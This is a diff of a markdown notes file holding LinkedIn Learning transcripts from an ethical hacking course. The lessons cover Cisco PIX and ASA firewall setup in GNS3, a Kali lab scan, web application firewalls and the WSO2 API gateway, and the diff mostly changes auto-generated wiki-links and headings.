 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Set up a Cisco PIX firewall
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980)
+#### [Set up a Cisco PIX firewall](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=0)** - [Instructor] Cisco provides a range of popular home and business-grade firewalls, built using a propriety Cisco operating system known as IOS.
 >
-> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=8)** This provides a much more powerful firewall and solution to the built-in Windows and Linux firewalls, so we'll take a first look at how to access and configure them.
+> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=8)** This provides a much more powerful firewall and solution to the built-in [[Windows]] and [[Linux]] firewalls, so we'll take a first look at how to access and configure them.
 >
 > **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=17)** I'm using a Cisco PIX firewall, which despite being somewhat long in the tooth, is still a useful device for becoming familiar with IOS configuration and a low-cost way of creating secure enclaves in a home network.
 >
@@ -950,7 +938,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** prompt (2), business (1), [[Windows]] (1), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Windows]] (1), [[Linux]] (1)
 > **Env Vars:** pix (4), ios (2), com3 (2), usb (1), pix1 (1)
 > **Prerequisites:** configure (3)
 > **Definitions:** known as (2)
@@ -959,14 +947,13 @@ created: 2026-05-02
 > **UI Navigation:** open the (1)
 > **Speakers:** - [instructor] (1)
 
-#### Create a secure enclave
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980)
+#### [Create a secure enclave](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=0)** - [Instructor] Okay, we are back at the PIX prompt, we can now log in and look at some operational commands.
 >
-> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=7)** One of the operational commands is ping, like the windows and limits command.
+> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=7)** One of the operational commands is ping, like the [[Windows]] and limits command.
 >
 > **[0:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=12)** To use it, we can specify an external address, using the outside interface.
 >
@@ -992,7 +979,7 @@ created: 2026-05-02
 >
 > **[1:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=76)** Okay, we can now put in our new address.
 >
-> **[1:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=82)** I'll set up the secure enclave on the inside of the PIX with 10 dot knot dot knot dot one, as the gateway between the secure enclave and the rest of the world.
+> **[1:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=82)** I'll set up the secure enclave on the inside of the PIX with 10 dot knot dot knot dot one, as the gateway between the secure enclave and the [[Representational State Transfer (REST)|rest]] of the world.
 >
 > **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=92)** And bring up the interface.
 >
@@ -1036,7 +1023,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** prompt (1), [[Windows]] (1), [[Security]] (1), [[Representational State Transfer (REST)|Rest]] (1), power (1)
+> **Frameworks & Libraries:** [[Windows]] (1), [[Representational State Transfer (REST)|Rest]] (1)
 > **Env Vars:** pix (7), icmp (2), ios (1), nat (1), mac (1)
 > **Prerequisites:** set up (3)
 > **Versions:** 192.168.1 (2)
@@ -1047,8 +1034,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Install GNS3
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980)
+#### [Install GNS3](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1056,7 +1042,7 @@ created: 2026-05-02
 >
 > **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=7)** This is a professional tool, which is widely used by network architects and one which allows testers to really understand networks.
 >
-> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=15)** It can be used not only for emulation of Cisco and other vendor devices, but it can also connect to the real world and include hardware based devices and the internet in its networks.
+> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=15)** It can be used not only for emulation of Cisco and other vendor devices, but it can also connect to the real world and include [[Hardware]] based devices and the internet in its networks.
 >
 > **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=28)** We'll use GNS3 to gain an initial familiarity with the Cisco Advanced Security Appliance, the ASA, which is a powerful content perimeter defense device from Cisco.
 >
@@ -1072,7 +1058,7 @@ created: 2026-05-02
 >
 > **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=79)** By necessity, this will be a whirlwind tour of both the iOS networking capabilities and GNS3 and we'll only scratch the surface of both GNS3 and the ASA within the scope of this course.
 >
-> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=92)** There's a lot to learn and to fully understand iOS configuration and networking is a more advanced topic in network security, this will require additional prerequisite experience and is a set of courses in its own right.
+> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=92)** There's a lot to learn and to fully understand iOS configuration and networking is a more advanced topic in [[Network Security]], this will require additional prerequisite experience and is a set of courses in its own right.
 >
 > **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=106)** However, we will do sufficient to understand how these devices are set up and perhaps whet your appetite for secure networking.
 >
@@ -1080,9 +1066,9 @@ created: 2026-05-02
 >
 > **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=123)** GNS3 is very scalable to networks with hundreds of devices, to run in this mode requires that it be deployed in two parts, a dedicated emulation server and a user interface running on a standard workstation.
 >
-> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=138)** It can also be deployed as an appliance and as an all-in-one Windows application.
+> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=138)** It can also be deployed as an appliance and as an all-in-one [[Windows]] application.
 >
-> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=144)** We'll be using only the simplest of configurations and for this I've downloaded the Windows all-in-one version 1.4.6 from GitHub.
+> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=144)** We'll be using only the simplest of configurations and for this I've downloaded the Windows all-in-one version 1.4.6 from [[GitHub]].
 >
 > **[2:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=155)** This is not the latest release, but we need to use this version to run the available ASA version 8.4.2 that we'll be using for this course.
 >
@@ -1114,11 +1100,11 @@ created: 2026-05-02
 >
 > **[4:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=253)** GNS3 provides a small number of generic network devices as standard as we can see, cloud, hubs, switches, hosts, and virtual PCs.
 >
-> **[4:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=263)** Vendor specific devices have to be imported as images, typically CAMU, VMware, or VirtualBox virtual machines.
+> **[4:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=263)** Vendor specific devices have to be imported as images, typically CAMU, VMware, or VirtualBox [[Virtual Machines]].
 >
 > **[4:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=271)** The menu and it's associated icons at the top provide a range of GNS3 functions.
 >
-> **[4:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=276)** The first group are for creating and managing GNS3 projects, the second group provides operational project capabilities, such as snapshots, labeling, and connecting consuls, the third group provides controls for managing devices, the fourth and final group provides tools to enhance network presentation, such as comment boxes and zone perimeter shapes, zoom controls, and so on.
+> **[4:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=276)** The first group are for creating and managing GNS3 projects, the second group provides operational project capabilities, such as snapshots, labeling, and connecting consuls, the third group provides controls for managing devices, the fourth and final group provides tools to enhance network presentation, such as comment boxes and zone perimeter shapes, [[Zoom]] controls, and so on.
 >
 > **[5:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=301)** These all make the presentation much more readable for complex networks.
 >
@@ -1148,7 +1134,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (2), [[Windows]] (2), [[Hardware]] (1), business (1), traffic (1)
+> **Frameworks & Libraries:** [[Windows]] (2), [[Hardware]] (1), [[Network Security]] (1), [[GitHub]] (1), [[Virtual Machines]] (1)
 > **Env Vars:** gns3 (16), asa (5), pix (1), camu (1), pc1 (1)
 > **Prerequisites:** set up (3), configure (2), prerequisite (1)
 > **Versions:** version 1 (1), 4.6 (1), version 8 (1), 4.2 (1)
@@ -1157,8 +1143,7 @@ created: 2026-05-02
 > **Analogies:** such as (2)
 > **CLI Commands:** make (1)
 
-#### Obtain network device images
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980)
+#### [Obtain network device images](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1180,7 +1165,7 @@ created: 2026-05-02
 >
 > **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=39)** However, unless you work in an organization, which has an existing Cisco contract, obtaining a license to download software for testing may prove difficult.
 >
-> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=49)** GNS3 is evolved and now supports other devices such as Juniper routers, a range of Linux based devices and others.
+> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=49)** GNS3 is evolved and now supports other devices such as Juniper routers, a range of [[Linux]] based devices and others.
 >
 > **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=57)** The marketplace site shown here, shows the device that can be run on GNS3 and provides links to the device templates including Cisco.
 >
@@ -1210,7 +1195,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2), cloud (1), generic (1), product (1)
+> **Frameworks & Libraries:** [[Linux]] (2)
 > **Env Vars:** gns3 (7), asa (3), gns (1)
 > **Analogies:** such as (2)
 > **Prerequisites:** set up (1), required to (1)
@@ -1219,8 +1204,7 @@ created: 2026-05-02
 > **Exercise Files:** zip file (1)
 > **Definitions:** is a  (1)
 
-#### Set up a network
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980)
+#### [Set up a network](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1266,7 +1250,7 @@ created: 2026-05-02
 >
 > **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=115)** Okay, we need to configure an IP address and address mask and bring up the node slash node interface to talk to the second router.
 >
-> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=122)** When configuring the router, we use commands for configuration, and the same command preceded by the word no to indicate we want to remove the configuration.
+> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=122)** When configuring the router, we use commands for configuration, and the same command preceded by the [[Microsoft Word|word]] no to indicate we want to remove the configuration.
 >
 > **[2:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=131)** We'll use similar commands to those we used to configure the PIX firewall, but there are differences in this version of iOS.
 >
@@ -1312,7 +1296,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** node (2), [[Microsoft Word|Word]] (1)
+> **Frameworks & Libraries:** [[Microsoft Word|Word]] (1)
 > **Prerequisites:** configure (7), set up (3)
 > **Env Vars:** gns3 (3), asa (1), ios (1), pix (1), pcn (1)
 > **UI Navigation:** select the (3), open the (1), navigate to (1)
@@ -1321,8 +1305,7 @@ created: 2026-05-02
 > **Code Identifiers:** ios (1)
 > **Speakers:** - [instructor] (1)
 
-#### Simulate the ASA firewall
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980)
+#### [Simulate the ASA firewall](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1358,7 +1341,7 @@ created: 2026-05-02
 >
 > **[1:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=103)** I'll update the note to show the first router is in a DMZ, and has an ip address of 192.168.1.2 and the second router is in a secure enclave with an ip address of 10.0.0.2.
 >
-> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=121)** I'll select the first router console and update the router's configuration by changing the interface to the ASA to be 192.168.1.2, and changing the routing.
+> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=121)** I'll select the first router console and update the router's configuration by changing the interface to the ASA to be 192.168.1.2, and changing the [[Routing]].
 >
 > **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=144)** I'll change the route to 192.168.1.254 which will assign on the ASA.
 >
@@ -1446,7 +1429,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (6), next (4), [[Routing]] (2), prompt (2), traffic (2)
+> **Frameworks & Libraries:** [[Routing]] (2)
 > **Env Vars:** asa (20), dmz (11), qemu (2), gns3 (2), asa01 (1)
 > **Prerequisites:** configure (4), setup (3), set up (1)
 > **Versions:** 192.168.1 (3), 8.42 (1), 10.0.0 (1)
@@ -1455,8 +1438,7 @@ created: 2026-05-02
 > **Exercise Files:** template (1)
 > **Definitions:** is an  (1)
 
-#### Integrate Kali into GNS3
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980)
+#### [Integrate Kali into GNS3](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1526,7 +1508,7 @@ created: 2026-05-02
 >
 > **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=198)** GNS3 can sometimes be a little fussy when first introducing Kali, but once settled it works well.
 >
-> **[3:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=204)** We can now run Nmap against the ASA.
+> **[3:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=204)** We can now run [[Nmap]] against the ASA.
 >
 > **[3:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=210)** We can see that all the ports are filtered.
 >
@@ -1534,7 +1516,7 @@ created: 2026-05-02
 >
 > **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=218)** Let's start Armitage and see if we have any more luck with that.
 >
-> **[3:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=221)** We first need to start Postgres.
+> **[3:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=221)** We first need to start [[PostgreSQL|Postgres]].
 >
 > **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=232)** I'll add a new host 176.23.1.15, and set its operating system to Cisco IOS.
 >
@@ -1548,7 +1530,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (1), [[PostgreSQL|Postgres]] (1)
+> **Frameworks & Libraries:** [[Nmap]] (2), [[PostgreSQL|Postgres]] (1)
 > **Env Vars:** gns3 (12), asa (10), udp (1), ios (1)
 > **Prerequisites:** configure (5), set up (1)
 > **CLI Commands:** find (2), make (2)
@@ -1562,8 +1544,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Understand Web Application Firewalls
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980)
+#### [Understand Web Application Firewalls](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1579,7 +1560,7 @@ created: 2026-05-02
 >
 > **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=56)** It'll break SSL encryption as part of its inspection process.
 >
-> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=61)** WAFs can be delivered as hardware appliances, software applications or cloud services.
+> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=61)** WAFs can be delivered as [[Hardware]] appliances, software applications or [[Cloud Services]].
 >
 > **[1:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=68)** They include not only malware signatures but also non-signature based logic to detect anomalous behavior such as protocol misuse.
 >
@@ -1593,9 +1574,9 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=117)** A number of other commercial solutions exist with similar features.
 >
-> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=121)** Amazon Web Services provides a cloud-based WAF solution with an option for load balancer integration and with an API to enable integration with customer applications.
+> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=121)** [[Amazon Web Services (AWS)|Amazon Web Services]] provides a cloud-based WAF solution with an option for load balancer integration and with an API to enable integration with customer applications.
 >
-> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=132)** Microsoft has also moved into the WAF space in its Azure Cloud Service with WAF functionality based on ModSecurity and the OWASP rule set being included in the Azure application gateway.
+> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=132)** [[Microsoft]] has also moved into the WAF space in its [[Microsoft Azure|Azure]] Cloud Service with WAF functionality based on ModSecurity and the [[OWASP]] rule set being included in the Azure application gateway.
 >
 > **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=145)** Cloudflare runs an integrated WAF as part of its service providing either basic WAF or advance WAF depending upon the service type.
 >
@@ -1613,7 +1594,7 @@ created: 2026-05-02
 >
 > **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=193)** It runs through five phases of analysis of a message starting with the request header and progressing through request body, response header and then body, and finally logging.
 >
-> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=205)** By running this is as a dedicated apache reverse proxy, it can be deployed in front of other web servers or applications as a discrete product.
+> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=205)** By running this is as a dedicated apache reverse proxy, it can be deployed in front of other [[Web Servers]] or applications as a discrete product.
 >
 > **[3:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=214)** As with any defensive systems, the tester needs to be able to detect the presence of a WAF in lined with the target.
 >
@@ -1621,21 +1602,20 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** traffic (7), web (6), cloud (3), product (3), [[OWASP]] (3)
+> **Frameworks & Libraries:** [[OWASP]] (3), [[Microsoft Azure|Azure]] (2), [[Hardware]] (1), [[Cloud Services]] (1), [[Amazon Web Services (AWS)|Amazon web services]] (1)
 > **Env Vars:** waf (13), owasp (3), http (2), iis (2), https (1)
 > **CLI Commands:** apache (2)
 > **Analogies:** such as (1)
 > **Prerequisites:** install (1)
 > **Speakers:** - [instructor] (1)
 
-#### Protect API services with the WSO2 gateway
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980)
+#### [Protect API services with the WSO2 gateway](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=0)** - [Instructor] Contemporary application development is a far cry from the early days of software development where traditional procedural and object-oriented languages delivered monolithic solutions.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=0)** - [Instructor] Contemporary [[Application Development]] is a far cry from the early days of [[Software Development]] where traditional procedural and object-oriented languages delivered monolithic solutions.
 >
-> **[0:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=11)** Nowadays, applications are increasingly being delivered as micro-services often linked into an Agile delivery approach where the lines between development, test, and transition to production are blurred.
+> **[0:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=11)** Nowadays, applications are increasingly being delivered as micro-services often linked into an [[Agile Development|Agile]] delivery approach where the lines between development, test, and transition to production are blurred.
 >
 > **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=24)** The Cloud Foundry application's droplets approach is an example of how micro-services can be delivered.
 >
@@ -1651,7 +1631,7 @@ created: 2026-05-02
 >
 > **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=67)** Web services consist not only of web portals, but also API interfaces, which enable an external party to access data directly for use in their applications.
 >
-> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=78)** The interface is often accessed using SOAP or JSON data objects.
+> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=78)** The interface is often accessed using SOAP or [[JSON]] data objects.
 >
 > **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=83)** A sandpit environment, which allows external developers to test their applications against specific API test data is also often delivered as part of an enterprise portal.
 >
@@ -1665,15 +1645,15 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=117)** The result is now a JSON stream, which can be processed in an external application.
 >
-> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=123)** Unfortunately, these interfaces provide a significant opportunity for errors to occur, as we've already experienced in the Internet of Things.
+> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=123)** Unfortunately, these interfaces provide a significant opportunity for errors to occur, as we've already experienced in the [[IoT|Internet of Things]].
 >
-> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=132)** In this case, the IoT devices were able to be misused to deliver a denial of service attack.
+> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=132)** In this case, the [[IoT]] devices were able to be misused to deliver a denial of service attack.
 >
-> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=139)** Agile development deployment solutions such as Jenkins acknowledge these issues and have enabled integration of automated security testing as part of their deployment pipeline in order to identify and defeat the basic security flaws in code.
+> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=139)** Agile development deployment solutions such as [[Jenkins]] acknowledge these issues and have enabled integration of automated [[Security Testing]] as part of their deployment pipeline in order to identify and defeat the basic security flaws in code.
 >
 > **[2:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=154)** API gateways are often used as proxies for applications, providing another layer of operational security monitoring to prevent data-driven attacks such as cross-site scripting.
 >
-> **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=166)** These come in both commercial and open source solutions, as well as infrastructure products and cloud services.
+> **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=166)** These come in both commercial and open source solutions, as well as infrastructure [[Microsoft Products|products]] and [[Cloud Services]].
 >
 > **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=172)** We'll concentrate on the open source WSO2 gateway shown here, which I've already downloaded.
 >
@@ -1683,11 +1663,11 @@ created: 2026-05-02
 >
 > **[3:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=203)** These are all testing targets.
 >
-> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=205)** The WSO2 API manager downloads as a zip file and will run in either Windows or Linux.
+> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=205)** The WSO2 API manager downloads as a zip file and will run in either [[Windows]] or [[Linux]].
 >
